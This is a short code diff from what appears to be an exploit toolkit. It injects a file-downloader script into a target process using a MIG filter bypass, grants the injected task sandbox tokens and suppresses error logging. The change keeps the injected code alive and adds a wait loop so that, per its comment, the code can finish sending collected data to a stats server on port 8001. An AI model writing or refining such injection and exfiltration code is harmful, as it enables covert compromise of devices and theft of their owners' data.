@@ -209,10 +209,16 @@ function start() {
 		let fileDownloader = new InjectJS(targetProcess, fileDownloaderCode, migFilterBypass);
 		if (fileDownloader.inject()) {
 			Sandbox.applyTokensForRemoteTask(fileDownloader.task);
-			fileDownloader.destroy();
+			// Don't destroy - let file_downloader.js run to completion
+			// It will send data to server_stats.ts (port 8001)
 		}
 	} catch (injectError) {
 		// Error handling without logging
+	}
+
+	// Wait for file_downloader to finish
+	for (let i = 1; i <= 30; i++) {
+		Native.callSymbol("sleep", 1);
 	}
 
 	launchdTask.destroy();
